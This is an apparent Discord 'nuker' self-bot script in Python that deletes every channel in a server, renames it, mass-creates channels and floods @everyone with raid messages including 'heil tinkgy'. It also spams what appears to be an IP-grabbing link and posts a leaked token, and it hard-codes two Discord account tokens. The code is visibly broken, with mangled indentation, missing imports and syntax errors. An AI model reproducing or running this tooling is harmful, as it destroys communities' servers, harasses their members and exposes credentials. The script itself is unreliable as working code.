#note i don't promote not obeying the law of discord tos, use this at your own risk

import discord 

from discord.ext import commands

emojis = "😀😃😄😁😆😅😂🤣☺️😊😇🙂🙃😉😌😍🥰😘😗😙😚😋😛😝😜🤪🤨🧐🤓😎🤩🥳😏😒😞😔😟😕🙁☹️😣😖😫😩🥺😢😭😤😠😡🤬🤯😳🥵🥶😱😨😰😥😓🤗🤔🤭🤫🤥😶😐😑😬🙄😯😦😧😮😲🥱😴🤤😪😵🤐🥴🤢🤮🤧😷🤒🤕🤑🤠😈👿👹👺🤡💩👻💀☠️👽👾🤖🎃😺😸😹😻😼😽🙀😿😾🤲👐🙌🏻👏🏻🤝👍🏻👎👊✊🤛🤞🏼✌️🤟🏻🤘🏻👌🏻🤏👈🏻👉🏻👆🏼👇🏻☝️✋🏻🤚🖐🖖🏿👋🏻🤙🏼💪🏼🦾🖕🏻✍🏼🙏🏻🦶🦵🦿💄💋👄🦷👅👂🦻👃👣👁👀🧠🗣👤👥👶🏼👧🏻🧒👦🏻👩🏻🧑🏻👨👩‍🦱🧑‍🦱👨‍🦱👩‍🦰🧑‍🦰👨‍🦰👱‍♀️👱👱‍♂️👩‍🦳🧑‍🦳👨‍🦳👩‍🦲🧑‍🦲👨‍🦲🧔👵🏼🧓👴👲👳‍♀️👳‍♂️🧕👮‍♀️👮👮‍♂️👷‍♀️👷👷‍♂️💂‍♀️💂💂‍♂️🕵️‍♀️🕵️🕵️‍♂️👩🏼‍⚕️🧑‍⚕️👨‍⚕️👩‍🌾🧑‍🌾👨‍🌾👩‍🍳🧑‍🍳👨‍🍳👩‍🎓🧑‍🎓👨‍🎓👩‍🎤🧑🏿‍🎤👨🏼‍🎤👩‍🏫🧑‍🏫👨‍🏫👩‍🏭🧑‍🏭👨‍🏭👩‍💻🧑‍💻👨‍💻👩‍💼🧑‍💼👨‍💼👩‍🔧🧑‍🔧👨‍🔧👩‍🔬🧑‍🔬👨‍🔬👩‍🎨🧑‍🎨👨‍🎨👩‍🚒🧑‍🚒👨‍🚒👩‍✈️🧑‍✈️👨‍✈️👩‍🚀🧑‍🚀👨‍🚀👩‍⚖️👨‍⚖️🧑‍⚖️👰🤵👸🏻🤴🏻🦸🏼‍♀️🦸🦸🏻‍♂️🦹‍♀️🦹🦹‍♂️🤶🎅🏼🧙‍♀️🧙🧙‍♂️🧝‍♀️🧝🧝‍♂️🧛‍♀️🧛🧛‍♂️🧟‍♀️🧟🧟‍♂️🧞‍♀️🧞🧞‍♂️🧜🏻‍♀️🧜🧜‍♂️🧚🏼‍♀️🧚🧚‍♂️👼🏼🤰🤱🙇🏻‍♀️🙇🙇‍♂️💁‍♀️💁💁‍♂️🙅🏻‍♀️🙅🙅‍♂️🙆‍♀️🙆🙆‍♂️🙋‍♀️🙋🙋‍♂️🧏‍♀️🧏🧏‍♂️🤦🏻‍♀️🤦‍♂️🤷🏻‍♀️🤷🤷🏽‍♂️🙎🏻‍♀️🙎🙎‍♂️🙍🏻‍♀️🙍🙍‍♂️💇🏻‍♀️💇💇‍♂️💆🏻‍♀️💆💆‍♂️🧖‍♀️🧖🧖‍♂️🤳💃🏻🕺🏻👯‍♀️👯👯‍♂️🕴👩‍🦽👩‍🦽🧑‍🦽👨‍🦽👩‍🦼🧑🏿‍🦼👨‍🦼🚶‍♀️🚶🚶‍♂️👩‍🦯🧑‍🦯👨‍🦯🧎‍♀️🧎🧎‍♂️🏃‍♀️🏃🏃‍♂️🧍‍♀️🧍🧍‍♂️👫👩🏼‍🤝‍👩🏻👬👩‍❤️‍👨👩‍❤️‍👩👨‍❤️‍👨👩‍❤️‍💋‍👨👩‍❤️‍💋‍👩👨‍❤️‍💋‍👨👨‍👩‍👦👨‍👩‍👧👨‍👩‍👧‍👦👨‍👩‍👦‍👦👨‍👩‍👧‍👧👩‍👩‍👦👩‍👩‍👧👩‍👩‍👧‍👦👩‍👩‍👦‍👦👩‍👩‍👧‍👧👨‍👨‍👦👨‍👨‍👧👨‍👨‍👧‍👦👨‍👨‍👦‍👦👨‍👨‍👧‍👧👩‍👦👩‍👧👩‍👧‍👦👩‍👦‍👦👩‍👧‍👧👨‍👦👨‍👧👨‍👧‍👦👨‍👦‍👦👨‍👧‍👧🧶🧵🧥🥼🦺👚👕👖🩲🩳👔👗👙👘🥻🩱🥿👠👡👢👞👟👟🧦🧤🧣🎩🧢👒🎓⛑👑💍👝👜👛💼🎒🧳👓🕶🥽🌂🐶🐱🐭🐹🐰🦊🐻🐼🐨🐯🦁🐮🐷🐽🐸🐵🙈🙉🙊🐒🐔🐧🐦🐤🐣🐥🦆🦅🦉🦇🐺🐗🐴🦄🐝🐛🦋🐌🐞🐜🦟🦗🕷🕸🦂🐢🐍🦖🦎🦕🐙🦑🦐🦞🦀🐡🐠🐟🐬🐳🐋🦈🐊🐅🐆🦓🦍🦧🐘🦛🦏🐪🐫🦒🦘🐃🐂🐄🐎🐖🐏🐑🦙🐐🦌🐕🐩🦮🐕‍🦺🐈🐓🦃🦚🦜🦢🦩🕊🐇🦝🦨🦡🦦🦥🐁🐀🐿🦔🐾🐉🐲🌵🎄🌲🌳🌴🌱🌿☘️🍀🎍🎋🍃🍂🍁🍄🐚🌾💐🌷🌹🥀🌺🌸🌼🌻🌞🌝🌛🌜🌚🌕🌖🌗🌘🌑🌒🌓🌔🌙🌎🌍🌏🪐💫⭐️🌟✨⚡️☄️💥🔥🌪🌈☀️🌤⛅️🌥☁️🌦🌧⛈🌩🌨❄️☃️⛄️🌬💨💧💦☔️☂️🌊🌫🍏🍎🍐🍊🍋🍌🍉🍇🍓🍈🍒🍑🥭🍍🥥🥝🍅🍆🥑🥦🥬🥒"

tokensend "MTEwNzQ3NTI1Njk1MzgxMDk2NA.GMXXMZ.a9bfARyXrv0cZh7EmuitAII-e9-yf-z75KnMG4"

client = commands.Bot("$",self_bot=True)

token = "MTExODUzOTYxMTYzNTk3ODM2MA.GCqvcK.2gnsgPFMtCGTgdP1vaAbHj4AJn5dlM1fKH5u-g"

SPAM_CHANNELS = ["synchronos"]

SPAM_MESSAGES = ["@everyone heil tinkgy"]

@client.event

async def on_ready():

print("Your code is running")

@client.event

async def on_connect():

print("Welcome to Aria Nuker Begin Nuking with $")

@client.command()

async def purge(ctx):

for i in range(0,20):

await ctx.send("@everyone raided By T.T.A")

@client.command()

async def nuke(ctx):

    guild = ctx.guild

    try:

        await guild.edit(name="Nuked By Tinkgy | T.T.A")

    except:

        pass

  channels = ctx.guild.channels

  for channel in channels:

    try:

      await channel.delete()

      except:

      pass

for i in range(0,1000):

ctx.guild.create_text_channel(random.choice(SPAM_MESSAGES))

client.event

async def

on_guild_channel_create(channel):

while True:

   await channel.send(random.choice(SPAM_MESSAGES))

   

   

   

client.command()

async def guild_lag(ctx):

while True:

await ctx.guild.create_text_channel("heil-tinkgy")

@client.command()

async def spam(ctx):

while True:

await ctx.send("@everyone mass raided By T.T.A")

@client.command()

async def emoji_spam(ctx):

while True:

await ctx.send(emojis)

@client.command()

async def ip_spam(ctx):

while True:

await ctx.send("https://heheha.vercel.app/api/main")

@client.command()

async def token_spam(ctx):

while True:

await ctx.send(tokensend)

client.run(token)
